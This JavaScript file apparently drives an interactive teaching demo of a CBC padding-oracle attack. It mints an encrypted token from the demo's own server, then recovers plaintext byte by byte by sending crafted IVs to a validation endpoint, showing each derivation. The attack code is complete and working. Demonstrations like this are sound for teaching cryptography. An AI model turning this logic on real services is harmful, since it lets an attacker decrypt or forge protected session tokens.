function $(id) {
  return document.getElementById(id);
}

function hexByte(n) {
  return Number(n).toString(16).padStart(2, "0");
}

function bytesToHex(bytes) {
  return Array.from(bytes, (b) => hexByte(b)).join("");
}

function b64ToBytes(b64) {
  const bin = atob(String(b64).trim());
  const out = new Uint8Array(bin.length);
  for (let i = 0; i < bin.length; i++) out[i] = bin.charCodeAt(i) & 0xff;
  return out;
}

function bytesToB64(bytes) {
  let bin = "";
  for (let i = 0; i < bytes.length; i++) bin += String.fromCharCode(bytes[i]);
  return btoa(bin);
}

function isPrintableAscii(b) {
  return b >= 0x20 && b <= 0x7e;
}

function renderRecovered(plainBytes, knownMask) {
  const hexParts = [];
  const asciiParts = [];
  for (let i = 0; i < 16; i++) {
    if (knownMask[i]) {
      const b = plainBytes[i];
      hexParts.push(hexByte(b));
      asciiParts.push(isPrintableAscii(b) ? String.fromCharCode(b) : ".");
    } else {
      hexParts.push("??");
      asciiParts.push("·");
    }
  }
  $("recoveredHex").textContent = hexParts.join(" ");
  $("recoveredAscii").textContent = asciiParts.join("");
}

async function postJson(url, body) {
  const res = await fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });
  const text = await res.text();
  return { status: res.status, text };
}

function clearDerivations() {
  const el = $("derivationLog");
  if (!el) return;
  el.innerHTML = "";
}

function appendDerivation({ pos, pad, guess, intermediateByte, ivOriginalByte, plainByte, status }) {
  const el = $("derivationLog");
  if (!el) return;

  const item = document.createElement("div");
  item.className = "derivation-item";

  const title = document.createElement("div");
  title.className = "derivation-title";
  const ascii = isPrintableAscii(plainByte) ? ` (${String.fromCharCode(plainByte)})` : "";
  title.textContent = `Recovered P[${pos}] = 0x${hexByte(plainByte)}${ascii}`;

  const pre = document.createElement("pre");
  pre.className = "demo-pre derivation-pre";
  pre.textContent = [
    `pad = 0x${hexByte(pad)}`,
    `winning guess: IV′[${pos}] = 0x${hexByte(guess)} (HTTP ${status})`,
    "",
    `X[${pos}] = IV′[${pos}] XOR pad`,
    `     = 0x${hexByte(guess)} XOR 0x${hexByte(pad)}`,
    `     = 0x${hexByte(intermediateByte)}`,
    "",
    `P[${pos}] = X[${pos}] XOR IV[${pos}]`,
    `     = 0x${hexByte(intermediateByte)} XOR 0x${hexByte(ivOriginalByte)}`,
    `     = 0x${hexByte(plainByte)}${ascii}`,
  ].join("\n");

  const explain = document.createElement("div");
  explain.className = "demo-muted derivation-explain";
  explain.textContent =
    "Explanation: “padding OK” means the crafted plaintext ends with the target pad value. That lets us compute X[i] (the AES-decrypt intermediate byte), then the real plaintext byte using the original IV.";

  item.appendChild(title);
  item.appendChild(pre);
  item.appendChild(explain);
  el.appendChild(item);
}

function interpretMintInput(rawInput) {
  const raw = String(rawInput || "").trim();
  if (!raw) {
    return {
      data: { user: "bob" },
      msg: 'Empty input → using default: {"user":"bob"}',
    };
  }

  try {
    const parsed = JSON.parse(raw);
    if (parsed && typeof parsed === "object" && !Array.isArray(parsed)) {
      return { data: parsed, msg: `Using JSON object as-is: ${JSON.stringify(parsed)}` };
    }
    if (typeof parsed === "string") {
      return { data: { user: parsed }, msg: `JSON string → wrapped as: ${JSON.stringify({ user: parsed })}` };
    }
    const asUser = JSON.stringify(parsed);
    return {
      data: { user: asUser },
      msg: `JSON value → wrapped as: ${JSON.stringify({ user: asUser })}`,
    };
  } catch {
    return { data: { user: raw }, msg: `Text → wrapped as: ${JSON.stringify({ user: raw })}` };
  }
}

async function mintToken(data) {
  const res = await fetch("/demo/padding-oracle/mint", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ data }),
  });
  if (!res.ok) {
    throw new Error(`Mint failed: HTTP ${res.status} ${await res.text()}`);
  }
  return await res.json();
}

function clearAttempts() {
  const tbody = $("attemptRows");
  tbody.innerHTML = "";
}

function buildByteTabs(state) {
  const wrap = $("byteTabs");
  if (!wrap) return;
  wrap.innerHTML = "";

  state.logPositions = [];
  for (let pos = 15; pos >= state.startPos; pos--) {
    state.logPositions.push(pos);
  }

  state.activeLogPos = state.pos;
  state.attemptLogs = {};
  state.logPositions.forEach((pos) => {
    state.attemptLogs[pos] = [];
    const btn = document.createElement("button");
    btn.type = "button";
    btn.className = "demo-byte-tab";
    btn.dataset.pos = String(pos);
    btn.setAttribute("role", "tab");
    btn.innerHTML = `<span class="label">Byte ${pos + 1}</span><span class="badge">0</span>`;
    btn.addEventListener("click", () => {
      if (state.running) return;
      setActiveByteTab(state, pos);
    });
    wrap.appendChild(btn);
  });

  setActiveByteTab(state, state.pos);
}

function updateByteTab(state, pos) {
  const btn = document.querySelector(`.demo-byte-tab[data-pos="${pos}"]`);
  if (!btn) return;
  const badge = btn.querySelector(".badge");
  const count = state.attemptLogs?.[pos]?.length ?? 0;
  if (badge) badge.textContent = String(count);
  btn.classList.toggle("done", !!state.known?.[pos]);
  btn.classList.toggle("active", state.activeLogPos === pos);
}

function setActiveByteTab(state, pos) {
  state.activeLogPos = pos;
  // Update all tab styles
  (state.logPositions ?? []).forEach((p) => updateByteTab(state, p));
  renderAttemptsForPos(state, pos);
}

function makeAttemptRowElement(pos, attempt) {
  const tr = document.createElement("tr");
  if (attempt.accepted) {
    tr.classList.add("success");
  } else if (attempt.oracleOk) {
    tr.classList.add("oracle-ok");
    tr.title = "Server reported valid padding, but not for the current target pad length.";
  }

  const tdI = document.createElement("td");
  tdI.textContent = String(attempt.index);

  const tdGuess = document.createElement("td");
  tdGuess.textContent = `0x${hexByte(attempt.guess)}`;

  const tdStatus = document.createElement("td");
  tdStatus.textContent = String(attempt.status);

  const tdIv = document.createElement("td");
  tdIv.className = "iv";
  try {
    const ivBytes = b64ToBytes(attempt.token).slice(0, 16);
    tdIv.innerHTML = ivToHighlightedHtml(ivBytes, pos);
  } catch {
    tdIv.textContent = "";
  }

  const tdSent = document.createElement("td");
  tdSent.className = "sent";
  tdSent.textContent = String(attempt.token || "");

  tr.appendChild(tdI);
  tr.appendChild(tdGuess);
  tr.appendChild(tdStatus);
  tr.appendChild(tdIv);
  tr.appendChild(tdSent);
  return tr;
}

function renderAttemptsForPos(state, pos) {
  clearAttempts();
  const tbody = $("attemptRows");
  if (!tbody) return;

  const attempts = state.attemptLogs?.[pos] ?? [];
  const frag = document.createDocumentFragment();
  attempts.forEach((a) => frag.appendChild(makeAttemptRowElement(pos, a)));
  tbody.appendChild(frag);
}

function recordAttempt(state, attempt) {
  const pos = attempt.pos;
  if (!state.attemptLogs[pos]) state.attemptLogs[pos] = [];
  state.attemptLogs[pos].push(attempt);

  // Update badge + done indicator
  updateByteTab(state, pos);

  if (state.activeLogPos === pos) {
    const tbody = $("attemptRows");
    if (tbody) tbody.appendChild(makeAttemptRowElement(pos, attempt));
  }
}

function ivToHighlightedHtml(iv, pos) {
  const parts = [];
  for (let i = 0; i < 16; i++) {
    const b = iv[i];
    const cls =
      i === pos ? "byte byte--guess" : i > pos ? "byte byte--forced" : "byte byte--orig";
    parts.push(`<span class="${cls}" title="IV[${i}] = 0x${hexByte(b)}">${hexByte(b)}</span>`);
  }
  return parts.join(" ");
}

function initAttackState(tokenB64, bytesToRecover) {
  const raw = b64ToBytes(tokenB64);
  if (raw.length < 32) throw new Error("Token is too short to demo (need IV + at least 1 block).");
  const iv = raw.slice(0, 16);
  const ct = raw.slice(16);
  if (ct.length % 16 !== 0) throw new Error("Ciphertext length must be multiple of 16 bytes.");
  if (ct.length < 16) throw new Error("Token must include at least 1 ciphertext block.");

  const clamped = Math.max(1, Math.min(16, Number(bytesToRecover) || 1));
  const startPos = 16 - clamped;

  return {
    tokenB64,
    ivOriginal: iv,
    // We intentionally TRUNCATE to a single block so that padding-checking applies to the block
    // we're attacking (standard padding-oracle technique).
    ctAttack: ct.slice(0, 16),
    startPos,
    pos: 15,
    guess: 0,
    attemptIndex: 1,
    intermediate: new Uint8Array(16),
    plain: new Uint8Array(16),
    known: new Uint8Array(16), // 0/1
    done: false,
    running: false,
    attemptLogs: {},
    logPositions: [],
    activeLogPos: 15,
  };
}

function craftedIvForGuess(state, pos, pad, guess) {
  const iv = state.ivOriginal.slice();
  for (let k = 15; k > pos; k--) {
    if (!state.known[k]) throw new Error("Internal: missing intermediate for tail byte.");
    iv[k] = state.intermediate[k] ^ pad;
  }
  iv[pos] = guess;
  return iv;
}

async function oracleStatusForToken(tokenB64) {
  const { status } = await postJson("/demo/padding-oracle/validate", { token: tokenB64 });
  return status;
}

function updateStepInfo(state, extra = "") {
  if (state.done) {
    const lines = ["Done."];
    if (extra) lines.push("", extra);
    $("stepInfo").textContent = lines.join("\n");
    return;
  }

  const pad = 16 - state.pos;
  const lines = [
    `Target byte position: ${state.pos} (0x${hexByte(state.pos)})`,
    `Target padding value: ${pad} (0x${hexByte(pad)})`,
    `Current guess: 0x${hexByte(state.guess)}`,
    "",
    "Attack detail:",
    "  We send a TRUNCATED token: (IV || first ciphertext block) so the padding check applies",
    "  to the block we are decrypting.",
    "",
    "We craft a new IV so that:",
    `  P'[${state.pos}] = 0x${hexByte(pad)}  (valid PKCS#7 padding for this step)`,
    "",
  ];
  if (extra) lines.push(extra);
  $("stepInfo").textContent = lines.join("\n");
}

async function stepAttack(state) {
  if (state.done) return;

  const pad = 16 - state.pos;
  const craftedIv = craftedIvForGuess(state, state.pos, pad, state.guess);
  const craftedRaw = new Uint8Array(16 + state.ctAttack.length);
  craftedRaw.set(craftedIv, 0);
  craftedRaw.set(state.ctAttack, 16);
  const craftedToken = bytesToB64(craftedRaw);

  const status = await oracleStatusForToken(craftedToken);
  const oracleOk = status !== 400;
  let paddingOk = oracleOk;

  // Avoid the classic last-byte false-positive: a guess can accidentally produce valid padding
  // of length > 1 (e.g., 0x02 0x02). We only accept it as "pad=0x01" if a tweak to the
  // second-to-last byte still keeps padding valid.
  if (paddingOk && state.pos === 15 && pad === 1) {
    const checkIv = craftedIv.slice();
    checkIv[14] ^= 1;
    const checkRaw = new Uint8Array(16 + state.ctAttack.length);
    checkRaw.set(checkIv, 0);
    checkRaw.set(state.ctAttack, 16);
    const checkToken = bytesToB64(checkRaw);
    const checkStatus = await oracleStatusForToken(checkToken);
    if (checkStatus === 400) paddingOk = false;
  }

  recordAttempt(state, {
    pos: state.pos,
    index: state.attemptIndex,
    guess: state.guess,
    status,
    oracleOk,
    accepted: paddingOk,
    token: craftedToken,
  });

  if (paddingOk) {
    const intermediateByte = state.guess ^ pad;
    const plainByte = intermediateByte ^ state.ivOriginal[state.pos];

    state.intermediate[state.pos] = intermediateByte;
    state.plain[state.pos] = plainByte;
    state.known[state.pos] = 1;

    appendDerivation({
      pos: state.pos,
      pad,
      guess: state.guess,
      intermediateByte,
      ivOriginalByte: state.ivOriginal[state.pos],
      plainByte,
      status,
    });

    const extra = [
      `FOUND guess 0x${hexByte(state.guess)} ⇒ padding OK (HTTP ${status})`,
      "",
      `Intermediate[${state.pos}] = guess XOR pad = 0x${hexByte(state.guess)} XOR 0x${hexByte(
        pad
      )} = 0x${hexByte(intermediateByte)}`,
      `Plaintext[${state.pos}] = Intermediate XOR IV_original = 0x${hexByte(
        intermediateByte
      )} XOR 0x${hexByte(state.ivOriginal[state.pos])} = 0x${hexByte(plainByte)}`,
    ].join("\n");

    renderRecovered(state.plain, state.known);

    // Show the derivation for the byte we just recovered.
    updateStepInfo(state, extra);
    updateByteTab(state, state.pos);

    // Advance to next byte and switch the attempts view to its tab.
    state.pos -= 1;
    state.guess = 0;
    state.attemptIndex = 1;

    if (state.pos < state.startPos) {
      state.done = true;
      updateStepInfo(state, extra);
      updateByteTab(state, state.pos + 1);
      return;
    }

    setActiveByteTab(state, state.pos);
    return;
  }

  state.guess += 1;
  state.attemptIndex += 1;
  if (state.guess > 255) {
    state.done = true;
    updateStepInfo(state, "No valid guess found (unexpected for a working oracle).");
  } else {
    updateStepInfo(state);
  }
}

document.addEventListener("DOMContentLoaded", async () => {
  const payloadEl = $("payload");
  const tokenEl = $("token");
  const revealEl = $("revealPlain");
  const plaintextBox = $("plaintextBox");
  const bytesToRecoverEl = $("bytesToRecover");

  let state = null;

  function desiredStartPosFromUI() {
    const n = Number(bytesToRecoverEl?.value) || 1;
    const clamped = Math.max(1, Math.min(16, n));
    return 16 - clamped;
  }

  function resetFromToken() {
    const n = Number(bytesToRecoverEl?.value) || 1;
    clearAttempts();
    clearDerivations();
    state = initAttackState(tokenEl.value || "", n);
    buildByteTabs(state);
    renderRecovered(state.plain, state.known);
    updateStepInfo(state);
  }

  async function doMint() {
    $("oracleOut").textContent = "";
    clearAttempts();
    clearDerivations();
    $("stepInfo").textContent = "";
    $("mintMsg").textContent = "";

    const { data, msg } = interpretMintInput(payloadEl.value);
    $("mintMsg").textContent = msg;
    const minted = await mintToken(data);

    tokenEl.value = minted.token || "";
    $("ivHex").textContent = minted.iv_hex || "";
    $("ctBlocks").textContent = (minted.ciphertext_blocks_hex || []).join("\n");
    $("plaintext").textContent = minted.plaintext || "";
    $("ptBlocks").textContent = (minted.plaintext_blocks_hex || []).join("\n");

    resetFromToken();
  }

  $("mintBtn").addEventListener("click", async () => {
    try {
      await doMint();
    } catch (err) {
      const msg = String(err?.message || err);
      $("mintMsg").textContent = msg;
      $("oracleOut").textContent = msg;
    }
  });

  revealEl.addEventListener("change", () => {
    plaintextBox.hidden = !revealEl.checked;
  });

  $("oracleBtn").addEventListener("click", async () => {
    const token = String(tokenEl.value || "").trim();
    if (!token) {
      $("oracleOut").textContent = "Mint a token first.";
      return;
    }
    const { status, text } = await postJson("/demo/padding-oracle/validate", { token });
    $("oracleOut").textContent = `HTTP ${status}\n${text}`;
  });

  $("resetBtn").addEventListener("click", () => {
    try {
      resetFromToken();
    } catch (err) {
      $("stepInfo").textContent = String(err?.message || err);
    }
  });

  $("stepBtn").addEventListener("click", async () => {
    try {
      if (!state || state.done || state.startPos !== desiredStartPosFromUI()) {
        resetFromToken();
      }
      await stepAttack(state);
    } catch (err) {
      $("stepInfo").textContent = String(err?.message || err);
    }
  });

  $("runBtn").addEventListener("click", async () => {
    try {
      if (!state || state.done || state.startPos !== desiredStartPosFromUI()) {
        resetFromToken();
      }
      if (state.running) return;
      state.running = true;

      $("runBtn").disabled = true;
      $("stepBtn").disabled = true;
      if (bytesToRecoverEl) bytesToRecoverEl.disabled = true;

      while (!state.done) {
        // eslint-disable-next-line no-await-in-loop
        await stepAttack(state);
        // Give the UI a chance to paint.
        // eslint-disable-next-line no-await-in-loop
        await new Promise((r) => window.setTimeout(r, 0));
      }
    } catch (err) {
      $("stepInfo").textContent = String(err?.message || err);
    } finally {
      if (state) state.running = false;
      $("runBtn").disabled = false;
      $("stepBtn").disabled = false;
      if (bytesToRecoverEl) bytesToRecoverEl.disabled = false;
    }
  });

  // Keep state in sync with the UI setting.
  bytesToRecoverEl?.addEventListener("change", () => {
    try {
      if (state?.running) return;
      resetFromToken();
    } catch (err) {
      $("stepInfo").textContent = String(err?.message || err);
    }
  });

  // Auto-mint on load (nice for teaching)
  try {
    await doMint();
  } catch (err) {
    $("oracleOut").textContent = String(err?.message || err);
  }
});

